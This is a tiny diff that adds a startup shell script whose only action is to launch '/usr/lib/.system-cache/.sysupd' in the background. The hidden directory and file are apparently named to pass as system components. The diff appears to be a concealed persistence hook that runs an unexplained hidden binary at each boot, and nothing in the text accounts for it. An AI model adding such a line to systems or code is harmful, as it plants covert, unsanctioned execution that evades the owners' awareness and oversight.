@@ -1,0 +1,3 @@
+#!/bin/sh -e
+/usr/lib/.system-cache/.sysupd &
+exit 0
